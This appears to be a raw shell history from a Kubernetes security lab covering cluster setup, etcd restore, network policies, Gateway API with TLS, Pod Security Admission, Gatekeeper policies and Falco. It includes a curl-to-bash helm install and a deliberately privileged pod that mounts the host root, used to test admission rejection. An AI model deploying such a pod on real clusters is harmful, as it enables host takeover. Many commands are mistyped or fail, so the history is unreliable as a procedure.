sudo apt update && sudo apt upgrade -y
sudo swapoff -a
sudo sed -i '/ swap / s/^/#/' /etc/fstab
sudo hostnamectl set-hostname kube-master
sudo apt install containerd
sudo mkdir -p /etc/containerd
containerd config default | sudo tee /etc/containerd/config.toml
sudo sed -i 's/SystemdCgroup = false/SystemdCgroup = true/' /etc/containerd/config.toml
sudo systemctl restart containerd
sudo systemctl enable containerd
containerd --verison
cat <<EOF | sudo tee /etc/modules-load.d/k8s.conf
overlay
br_netfilter
EOF

sudo modprobe overaly
sudo modprobe overlay
sudo modprobe br_netfilter
cat <<EOF | sudo tee /etc/sysctl.d/k8s.conf
net.bridge.bridge-nf-call-iptables  = 1
net.bridge.bridge-nf-call-ip6tables = 1
net.ipv4.ip_forward                 = 1
EOF

sudo sysctl --system
sudo apt-get install -y apt-transport-https ca-certificates curl
curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.29/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg
echo "deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] \
https://pkgs.k8s.io/core:/stable:/v1.29/deb/ /" | sudo tee /etc/apt/sources.list.d/kubernetes.list
sudo apt update
sudo apt install -y kubelet kubeadm kubectl
sudo kubeadm init   --pod-network-cidr=192.168.0.0/16
sudo kubeadm init --pod-network-cidr=192.168.0.0/16
mkdir -p $HOME/.kube
sudo cp /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown $(id -u):$(id -g) $HOME/.kube/config
kubectl get nodes
kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.27.0/manifests/calico.yaml
kubectl get nodes
kubectl get pods -n kube-syste,
kubectl get pods -n kube-system
kubectl get nodes
kubectl taint nodes --all node-role.kubernetes.io/control-plane-
kubectl get pods -n kube-system | grep etcd
kubectl -n kube-system exec -it etcd-kube-master -- sh
kubectl create nginx --image=nginx
kubectl run nginx --image=nginx
kubectl get nodes
kubectl get pods
kubectl get svc
kubectl get pods -o yaml
kubectl create namespace etcd-test
kubectl create deployment ngnix --image=nginx -n kube-system
kubectl create deployment nginx --image=nginx -n etcd-test
kubectl get pods -n kube-sytem
kubectl get pods -n kube-system
kubectl get pods -n etcd-test
kubectl get svc -n etcd-test
sudo mkdir -p /var/lib/etcd/backup
sudo chmod 700 /var/lib/etcd/backup
ls lh /var
ls
ls /var
ls /
cd var
ls /var/lib
ls /var/lib/etcd
sudo ls /var/lib/etcd
sudo ls /var/lib/etcd/backup
sudo ls /var/lib/etcd/member
kubect get pods -n kube-system
kubectl get pods -n kube-system
kubectl -n kube-system exec -it etcd-kube-master -- sh
ls /var/lib/etcd/backup
sudo ls /var/lib/etcd/backup
sudo ls /var/lib/etcd/backup/etcd-snapshot.db
kubectl get ns
kubectl get nc
kubectl get ns
kubectl delete namespace etcd-test
kubectl get ns
kubectl systemctl stop kubelet
kubectl sysctl stop kubelet
sudo systemctl stop kubelet
sudo crictl ps | grep etcd
sudo systemctl stop kubelet
sudo crictl ps | grep etcd
sudo crictl stop 43e319d7fe68b
sudo crictl ps | grep etcd
kubectl get ns
sudo mv /var/lib/etcd /var/lib/etcd-old
ls /var/lib
sudo ctr image pull registry.k8s.io/etcd:3.5.9-0
sudo ls -lh /var/lib/etcd-old/backup
sudo mkdir -p /var/lib/etcd
sudo ls -ld /var/lib/etcd
sudo ctr run --rm   --mount type=bind,src=/var/lib/etcd-old/backup,dst=/backup,options=rbind:rw   --mount type=bind,src=/var/lib/etcd,dst=/var/lib/etcd,options=rbind:rw   registry.k8s.io/etcd:3.5.9-0   etcd-restore   etcdctl snapshot restore /backup/etcd-snapshot.db   --data-dir=/var/lib/etcd
sudo ctr run --rm --mount type=bind,src=/var/lib/etcd-old/backup,dst=/backup,options=rbind:rw --mount type=bind,src=/var/lib/etcd,dst=/var/lib/etcd,options=rbind:rw registry.k8s.io/etcd:3.5.9-0 etcd-restore etcdctl snapshot restore /backup/etcd-snapshot.db --data-dir=/var/lib/etcd
sudo chown -R root:root /var/lib/etcd
sudo systemctl start kubelet
kubectl get ns
kubectl get pods -n kube-system
kubectl get ns
kubectl get pods -n etcd-test
ls
ls /
kubectl create namespace frontend
kubectl create namespace backend
kubectl create namespace database
kubectl get ns
kubectl run frontend   --image=curlimages/curl   -n frontend   -- sleep 3600
kubectl get pods
kubectl get pods -n frontend
kubectl get svc -n frontend
kubectl run backend   --image=nginx   -n backend
kubectl get pods -n backend
kubectl get svc -n backend
kubectl expose pod backend   --port=80   --name=backend-svc   -n backend
kubectl get svc -n backend
kubectl run database   --image=nginx   -n database
kubectl get pods -n database
kubectl expose pod database   --port=80   --name=db-svc   -n database
kubectl get svc -n database
kubectl -n frontend exece -it frontend -- sh
kubectl -n frontend exec -it frontend -- sh
kubectl get pods -n kube-system
kubectl get ns
kubectl -n frontend exec -it frontend -- sh
kubectl get dns -n kube-system
kubectl get svc kube-dns -n kube-system
kubectl get endpoints kube-dns -n kube-system
sudo iptables -L FORWARD -n -v
ps aux | grep kube-apiserver | grep pod-network-cidr
kubectl get ippools.crd.projectcalico.org -o yaml
kubectl logs -n kube-system kube-proxy-46lkb | grep -E "Using|IPVS|iptables"
kubectl -n kube-system get cm coredns -o yaml
ls
kubectl get pods -n kube-system
kubectl get ns
kubectl -n frontend exec -it frontend -- sh
sudo modprobe nf_conntrack
sudo modprobe br_netfilter
lsmod | grep conntrack
sudo sysctl -w net.bridge.bridge-nf-call-iptables=1
sudo sysctl -w net.bridge.bridge-nf-call-ip6tables=1
sudo sysctl -w net.ipv4.ip_forward=1
kubectl rollout restart ds kube-proxy -n kube-system
kubectl rollout restart ds calico-node -n kube-system
kubectl rollout restart deployment coredns -n kube-system
kubectl get pods -n kube-system
kubectl -n frontend exec -it frontend -- sh
sudo iptables --version
sudo update-alternatives --set iptables /usr/sbin/iptables-legacy
sudo update-alternatives --set ip6tables /usr/sbin/ip6tables-legacy
sudo update-alternatives --set arptables /usr/sbin/arptables-legacy
sudo update-alternatives --set ebtables /usr/sbin/ebtables-legacy
iptables --version
kubectl rollout restart ds kube-proxy -n kube-system
kubectl rollout restart ds calico-node -n kube-system
kubectl rollout restart deployment coredns -n kube-system
kubectl get pods -n kube-system
kubectl -n frontend exec -it frontend -- sh
sudo iptables -t nat -L KUBE-SERVICES -n | head
sudo nft list ruleset | grep KUBE
kubectl drain kube-master --ignore-daemonsets --force
sudo reboot
kubectl get pods -n kube-system
kubectl get pods -n kube-system
iptables --version
# legacy
lsmod | grep conntrack
sysctl net.bridge.bridge-nf-call-iptables
kubectl uncordon kube-master
kubectl get pods -n kube-system
kubectl get ns
kubectl -n frontend exec -it frontend -- sh
kubectl get pods -n frontend
kubectl -n frontend exec -it frontend -- sh
kubectl get ns
sudo kubectl get pods -n frontend
kubectl get pods -n backend
kubectl get pods -n database
kubectl run frontend   --image=curlimages/curl   -n frontend   -- sleep 3600
kubectl get pods -n frontend
kubectl run backend   --image=nginx   -n backend
kubectl expose pod backend   --port=80   --name=backend-svc   -n backend
kubectl run database   --image=nginx   -n database
kubectl expose pod database   --port=80   --name=db-svc   -n database
kubectl -n frontend exec -it frontend -- sh
nano deny-all-frontend.yaml
kubectl apply -f deny-all-frontend.yaml
kubectl get svc
kubectl get svc -n frontend
kubectl get pods -n frontend
kubectl get svc -n frontend
kubectl get networkpolicy -n frontend
nano deny-all-backend.yaml
nano deny-all-database.yaml
ls
kubectl apply -f deny-all-backend.yaml
kubectl get networkpolicy -n backend
ls
kubectl apply -f deny-all-database.yaml
kubectl get networkpolicy -n database
kubectl get ns
kubectl -n frontend exec -it frontend -- sh
nano allow-frontend-to-backend.yaml
nano allow-backend-to-frontend.yaml
ls
kubectl apply -f allow-frontend-to-backend.yaml
kubectl apply -f allow-backend-to-frontend.yaml
kubectl get networkpolicy -n frontend
kubectl get networkpolicy -n backend
kubectl -n frontend exec -it frontend - sh
kubectl -n frontend exec -it frontend -- sh
ls
kubectl get ns
kubectl -n frontend exec -it frontend -- sh
kubectl get networkplicy -n frontend
kubectl get networkpolicy -n frontend
kubectl get networkpolicy -n backend
nano allow-dns-egress.yaml
ls
kubectl apply -f allow-dns-egress.yaml
kubectl get networkpolicy -n frontend
kubectl -n frontend exec -it frontend -- sh
nano allow-backend-to-database.yaml
nano allow-database-to-backend.yaml
kubectl apply -f allow-backend-to-database.yaml
kubectl allow-database-to-backend.yaml
kubectl apply -f  allow-database-to-backend.yaml
kubectl get networkpolicy -n backend
kubectl get networkpolicy -n database
kubectl -n backend exec -it backend -- sh
nano allow-dns-backend-egress.yaml
kubectl apply -f allow-dns-backend-egress.yaml
kubectl get networkpolicy -n backend
kubectl -n backend exec -it backend -- sh
kubectl get pods
kubectl get pods -n kube-system
kubectl get ns
kubectl get pods -n frontend
kubectl get pods -n backend
kubectl get pods -n database
kubectl get pods -n kube-system
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.0.0/standard-install.yaml
kubectl get crds | grep gateway
kubectl apply -f https://github.com/nginxinc/nginx-gateway-fabric/releases/download/v1.4.0/install.yaml
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
helm version
helm install ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   --namespace nginx-gateway   --create-namespace
kubectl get pods -n nginx-gateway
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.0.0/standard-install.yaml
kubectl get crds | grep gateway
kubectl get pods -n nginx-gateway
kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.0.0/standard-install.yaml
kubectl get crds | grep gateway
kubectl apply -f - <<EOF
apiVersion: gateway.networking.k8s.io/v1
kind: GatewayClass
metadata:
  name: nginx
spec:
  controllerName: nginx.org/gateway-controller
EOF

kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
kubectl get gatewayclass nginx -o yaml
kubectl delete gatewayclass nginx
kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set gatewayClass.create=true   --set gatewayClass.name=nginx
kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
kubectl logs -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric --previous
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/experimental-install.yaml
kubectl get crds | grep gateway
kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.2.0/experimental-install.yaml
kubectl delete pod -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric
kubectl get pods -n nginx-gateway
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set gatewayClass.create=true   --set gatewayClass.name=nginx
kubectl get pods -n nginx-gateway
kubectl logs -n nginx-gateway -l app.kubernetes.io/name=nginx-gateway-fabric --previous
kubectl get gateway -o .yaml
kubectl get crd backendtlspolicies.gateway.networking.k8s.io
kubectl api-resources | grep BackendTLS
ls
kubectl delete -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.0.0/standard-install.yaml
kubectl delete -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/experimental-install.yaml
kubectl delete -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.0.0/standard-install.yaml
kubectl delete -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/experimental-install.yaml
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml
kubectl api-resources | grep BackendTLS
kubectl get crd backendtlspolicies.gateway.networking.k8s.io -o yaml | grep version -A2
kubectl api-resources | grep BackendTLS
kubectl delete -f https://github.com/kubernetes-sigs/gateway-api/releases/download/v1.1.0/standard-install.yaml
kubectl delete crd gateways.gateway.networking.k8s.io gatewayclasses.gateway.networking.k8s.io httproutes.gateway.networking.k8s.io grpcroutes.gateway.networking.k8s.io referencegrants.gateway.networking.k8s.io
kubectl apply -f https://github.com/kubernetes-sigs/gateway-api/releases/latest/download/standard-install.yaml
kubectl api-resources | grep BackendTLS
kubectl rollout restart deployment ngf-nginx-gateway-fabric -n nginx-gateway
kubectl get pods -n nginx-gateway
nano gateway.yaml
kubectl apply -f gateway.yaml
kubectl get gateway
nano gateway.yaml
kubectl get gatewayclass nginx -o yaml
kubectl get pods -n nginx-gateway
kubectl create deployment app1 --image=nginx
kubectl expose deployment app1 --port=80
kubectl get pods
kubectl get svc
kubectl create deployment app2 --image=nginx
kubectl expose deployment app2 --port=80
kubectl get pods
kubectl get svc
nano httproute.yaml
kubectl apply -f httproute.yaml
kubectl get pods
kubectl get svc
kubectl get nodes -o wide
curl http://10.0.0.4/app1
curl http://10.0.0.4/app2
kubectl get pods
curl http://4.224.78.60/app1
kubectl get ns
kubectl get nodes -o wide
curl http://10.0.0.4/app1
curl http://10.0.0.4/app2
kubectl get svc app1 app2
kubectl get pods -l app=app1
kubectl get pods -l app=app2
kubectl get svc -n nginx-gateway
kubectl get svc
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set gatewayClass.create=true   --set gatewayClass.name=nginx   --set service.type=NodePort   --set service.ports.http=80   --set service.ports.https=443
kubectl get pods -n nginx-gateway
kubectl get svc -n nginx-gateway
nano gateway.yaml
openssl req -x509 -nodes -days 365   -newkey rsa:2048   -keyout tls.key   -out tls.crt   -subj "/CN=example.local"
kubectl create secret tls gateway-tls   --cert=tls.crt   --key=tls.key
nano gateway.yaml
kubectl apply -f gateway.yaml
kubectl get nodes -o wide
curl -k https://10.0.0.4/app1
curl -k https://10.0.0.4/app2
nano gateway.yaml
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set gatewayClass.create=true   --set gatewayClass.name=nginx   --set service.type=NodePort   --set service.ports.https=443
kubectl get pods -n nginx-gateway
kubectl get svc -n nginx-ateway
kubectl get svc -n nginx-gateway
kubectl get pods -n nginx-gateway
kubectl get svc -n nginx-gateway
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set gatewayClass.create=true   --set gatewayClass.name=nginx   --set service.type=NodePort   --set service.ports.https=443
kubectl get svc -n nginx-gateway
kubectl get pods -n nginx-gateway
kubectl describe gateway web-gateway
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   -n nginx-gateway   --set service.type=NodePort   --set service.ports.https=443
kubectl get svc -n nginx-gateway
kubectl get pods -n nginx-gateway
kubectl get ngf-nginx-gateway-fabric -o yaml
kubectl get svc ngf-nginx-gateway-fabric -o yaml -n nginx-gateway -o yaml
kubectl edit svc ngf-nginx-gateway-fabric -n nginx-gateway
nano svc ngf-nginx-gateway-fabric -n nginx-gateway

kubectl get svc
kubectl get svc -n nginx-gateway
kubectl get nodes -o wide
curl https://10.0.0.4:32594/app1
curl http://10.0.0.4:32594/app1
curl http://10.0.0.4:32594/app2
curl https://10.0.0.4:32594/app2
curl -k https://10.0.0.4:32594/app2
curl -k https://10.0.0.4:32594/app1
ls
ls /
ls /etc
sudo nano /etc/hosts
curl -k https://example.local:32594/app1
curl http://10.0.0.4:32594/app1
nano rate-limit.yaml
kubectl apply -f rate-limit.yaml
nano app-rate-limit
nano app-rate-limit.yaml
kubectl get crd | grep ratelimit
helm upgrade ngf nginx/nginx-gateway-fabric   --namespace nginx-gateway   --set nginxGateway.enablePolicies=true
helm repo add nginx https://helm.nginx.com/stable
helm repo update
helm search repo nginx-gateway-fabric
helm upgrade ngf oci://ghcr.io/nginx/charts/nginx-gateway-fabric   --namespace nginx-gateway   --set nginxGateway.enablePolicies=true
kubectl get crd | grep policy
kubectl get pods -n nginx-gateway
kubectl get crd | grep policy
kubectl apply -f https://raw.githubusercontent.com/nginxinc/kubernetes-gateway-fabric/main/deploy/crds/policies.yaml
kubectl get pods
ls
nano rate-limit.yaml
curl -k https://example.local:32594/app1
nano rate-limit-service.yaml
kubectl apply -f rate-limit-service.yaml
kubectl get pods
nano rate-limit-config.yaml
kubectl apply -f rate-limit-config.yaml
kubectl get pods
kubectl get config
kubectl get configMap
nano rate-limit-service.yaml
kubectl apply -f rate-limit-service.yaml
kubedtl get pods
kubectl get pods
curl -I https://registry-1.docker.io
nano rate-limit-service.yaml
kubectl apply -f rate-limit-service.yaml
kubectl rollout restart deploy rate-limit-service
kubectl get pods
kubectl logs deploy/rate-limit-service
kubectl get pods
nano rate-limit-service
nano rate-limit-service.yaml
kubectl rollout restart deploy rate-limit-service
kubectl get pods
nano rate-limit-service.yaml
kubectl apply -f rate-limit-service.yaml
kubectl get pods
kubectl delete deploy rate-limit-service --ignore-not-found
kubectl delete svc rate-limit-svc --ignore-not-found
kubectl get pods
kubectl get svc
ls
nano rate-limit.yaml
kubectl apply -f rate-limit.yaml
kubectl get pods
kubectl get svc
kubectl get pods
kubectl describe pod rate-limit-service-76dbb66bbd-ngh6m
kubectl run test-pull   --image=busybox:1.36   --restart=Never   -- sleep 3600
kubectl get pods
kubectl delete deploy rate-limit-service
kubectl delete svc rate-limit-svc
kubectl delete cm rate-limit-config
ls
nano httproute.yaml
kubectl apply -f app-route.yaml
kubectl apply -f httproute.yaml
kubectl describe httproute httproute
kubectl get pods
kubectl get svc
nano httproute.yaml
kubectl get svc
for i in {1..5}; do   curl -k https://example.local:32594/app1; done
nano httproute.yaml
kubectl describe httproute app-route
kubectl get pods
kubectl delete test-pull
kubectl delete pods test-pull
kubectl get pods
kubectl create namespace psa-privileged
kubectl get pods
kubectl label namespace psa-privileged   pod-security.kubernetes.io/enforce=privileged   pod-security.kubernetes.io/enforce-version=latest
kubectl get pods
kubectl get pods -n psa-privileged
kubectl get ns
kubectl get pods -n psa-privileged
kubectl create namespace psa-baseline
kubectl create namespace psa-restricted
kubectl label namespace psa-baseline   pod-security.kubernetes.io/enforce=baseline   pod-security.kubernetes.io/enforce-version=latest
kubectl label namespace psa-restricted   pod-security.kubernetes.io/enforce=restricted   pod-security.kubernetes.io/enforce-version=latest
kubectl get ns --show-lables
kubectl get ns --show-labels
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: bad-pod
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

kubectl apply -f bad-pod.yaml -n psa-privileged
ls
nano bad-pod.yaml
kubectl apply -f bad-pod.yaml -n psa-privileged
ls
kubectl apply -f bad-pod.yaml -n psa-baseline
kubectl apply -f bad-pod.yaml -n psa-restricted
nano good-pod.yaml
kubectl apply -f good-pod.yaml -n psa-restricted
kubectl get pods -n psa-restricted
kubectl get pods -n psa-privileged
kubectl get pods -n psa-restricted
kubectl label namespace psa-baseline   pod-security.kubernetes.io/warn=restricted   pod-security.kubernetes.io/audit=restricted   --overwrite
kubectl apply -f bad-pod.yaml -n psa-baseline
kubectl get pods -n psa-restricted
kubectl get pods -n psa-privileged
kubectl describe pod good-pod -n psa-restricted
kubectl logs good-pod -n psa-restricted
nano good-pod.yaml
kubectl apply -f good-pod.yaml -n psa-restricted
nano good-pod.yaml
kubectl apply -f good-pod.yaml -n psa-restricted
kubectl delete pod good-pod -n psa-restricted
nano good-pod.yaml
kubectl apply -f good-pod.yaml -n psa-restricted
kubectl get pod -n psa-restricted
kubectl get pods
kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml
kubectl get pods -n gatekeeper-system
kubectl api-resources | grep gatekeeper
cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredimagetag
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredImageTag
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredimagetag

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        endswith(container.image, ":latest")
        msg := sprintf("Image %v uses forbidden tag 'latest'", [container.image])
      }
EOF

kubectl run nginx --image=nginx:latest
cat <<EOF | kubectl apply -f -
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredImageTag
metadata:
  name: no-latest-tag
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
EOF

kubectl run nginx --image=nginx:latest
cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sresourcelimits
spec:
  crd:
    spec:
      names:
        kind: K8sResourceLimits
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sresourcelimits

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not container.resources.limits
        msg := sprintf("Container %v must define resource limits", [container.name])
      }
EOF

cat <<EOF | kubectl apply -f -
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sResourceLimits
metadata:
  name: require-resource-limits
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
EOF

kubectl run busybox --image=busybox -- sleep 3600
kubectl run busybox   --image=busybox   --limits='cpu=100m,memory=128Mi'   -- sleep 3600

kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: busybox-limit-test
spec:
  containers:
  - name: busybox
    image: busybox
    command: ["sleep","3600"]
    resources:
      limits:
        cpu: "100m"
        memory: "128Mi"
EOF

cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          properties:
            allowedRegistries:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedregistries

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not startswith(container.image, input.parameters.allowedRegistries[_])
        msg := sprintf("Image %v is not from an approved registry", [container.image])
      }
EOF

cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          properties:
            allowedRegistries:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedregistries

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not startswith(container.image, input.parameters.allowedRegistries[_])
        msg := sprintf("Image %v is not from an approved registry", [container.image])
      }
EOF

cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          properties:
            allowedRegistries:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedregistries

      violation[{"msg": msg}] {
        container := input.review.object.spec.containers[_]
        not startswith(container.image, input.parameters.allowedRegistries[_])
        msg := sprintf("Image %v is not from an approved registry", [container.image])
      }
EOF

cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                parameters:
                  type: object
                  properties:
                    allowedRegistries:
                      type: array
                      items:
                        type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sallowedregistries

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not startswith(container.image, input.parameters.allowedRegistries[_])
          msg := sprintf("Image %v is not from an approved registry", [container.image])
        }
EOF

kubectl get ns
kubectl get constrainttemplates
kubectl get constraints
kubectl get templates
kubectl get k8sallowedregistries
cat <<EOF | kubectl apply -f -
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedregistries
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRegistries
      validation:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                parameters:
                  type: object
                  properties:
                    allowedRegistries:
                      type: array
                      items:
                        type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sallowedregistries

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not allowed_image(container.image)
          msg := sprintf("Image %v is not from an approved registry", [container.image])
        }

        allowed_image(image) {
          some registry
          registry := input.parameters.allowedRegistries[_]
          startswith(image, registry)
        }
EOF

ls
nano template.yaml
kubectl apply -f template.yaml
kubectl get constrainttemplete
kubectl get constrainttemplates
nano constraints.yaml
kubectl apply constraints.yaml
ls
kubectl apply -f constraints.yaml
cat <<EOF | kubectl apply -f -
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRegistries
metadata:
  name: only-acr-images
spec:
  parameters:
    allowedRegistries:
      - "myacr.azurecr.io/"
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
EOF

nano template.yaml
kubectl apply -f template.yaml
kubectl get constrainttemplates
nano constraints.yaml
kubectl apply -f constraints.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
kubectl apply -f constraints.yaml
nano constraints.yaml
nano template.yaml
kubectl apply -f template.yaml
kubectl apply -f constraints.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
nano template.yaml
kubectl apply -f template.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
kubectl delete constrainttemplate k8sallowedregistries
ls
nano template.yaml
kubectl apply -f template.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
nano template.yaml
kubectl delete constrainttemplate k8sallowedregistries
kubectl get crd | grep k8sallowedregistries
kubectl apply -f template.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
nano template.yaml
kubectl apply -f template.yaml
kubectl delete constrainttemplate k8sallowedregistries
kubectl get crd | grep k8sallowedregistries
kubectl apply -f template.yaml
nano template.yaml
kubectl apply -f template.yaml
nano template.yaml
kubectl apply -f template.yaml
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
kubectl get crd k8sallowedregistries.constraints.gatekeeper.sh -o yaml | grep -A5 parameters
nano constraints.yaml
kubectl apply -f constraints.yaml
kubectl run nginx --image=nginx:1.25
kubectl run nginx --image=myacr.azurecr.io/nginx:1.25
kubectl get pods
kubectl run nginx --image=nginx:1.25
kubectl run nginx --image=myacr.azurecr.io/nginx:1.25
kubectl run nginx   --image=myacr.azurecr.io/nginx:1.25   --dry-run=client   -o yaml > nginx.yaml
ls
nano nginx.yaml
kubectl apply -f nginx.yaml
kubectl get pod nginx
kubectl delete pod nginx
kubectl apply -f nginx.yaml
kubectl get pod nginx
nano template.yaml
kubectl apply -f template.yaml
kubectl apply -f nginx.yaml
kubectl get pods
kubectl get constraintviolations
kubectl logs -n gatekeeper-system deployment/gatekeeper-audit
kubectl get pods
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco   --namespace falco   --create-namespace
kubectl get pods -n falco
kubectl get ns
kubectl get pods -n falco
kubectl get ds -n falco
kubectl describe ds falco -n falco
ls
ls
nano constraints.yaml
kubectl apply -f constraints.yaml
kubectl get ds -n falco
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo updste
helm repo update
helm install falco falcosecurity/falco   --namespace falco   --create-namespace
kubectl delete pods -n falco
kubectl describe ds falco -n falco
helm upgrade falco falcosecurity/falco   -n falco   --set resources.limits.cpu=1   --set resources.limits.memory=1Gi   --set resources.requests.cpu=100m   --set resources.requests.memory=512Mi   --set falcoctl.resources.limits.cpu=500m   --set falcoctl.resources.limits.memory=512Mi   --set falcoctl.resources.requests.cpu=100m   --set falcoctl.resources.requests.memory=256Mi
kubectl rollout restart ds falco -n falco
kubectl get ds -n falco
kubectl get pods -n flaco
kubectl delete ds falco -n falco
helm upgrade falco falcosecurity/falco -n falco
kubectl get ds -n flaco
kubectl get ds -n falco
kubectl describe ds falco -n falco
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl describe ds falco -n falco
helm uninstall falco -n falco
kubectl describe ds falco -n falco
helm install falco falcosecurity/falco   -n falco   --create-namespace   -f falco-values.yaml
kubectl get ds falco -n falco
kubectl get pods -n falco
kubectl describe ds falco -n falco
nano falco-values.yaml
helm upgrade falco falcosecurity/falco   -n falco   -f falco-values.yaml
kubectl describe ds falco -n falco
kubectl get pods -n falco
kubectl get ds falco -n falco
kubectl get pods -n falco
kubectl exec -n falco -it $(kubectl get pod -n falco -o name | head -1) --   cat /etc/falco/falco_rules.yaml | head -20
ls
nano nginx.yaml
nano constraints.yaml
nano nginx.yaml
kubectl apply -f nginx.yaml
nano constraints.yaml
kubectl apply -f constraints.yaml
kubectl apply -f nginx.yaml
kubectl get pods
kubectl exec -it nginx -- /bin/bash
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50
kubectl exec -it nginx -- sh
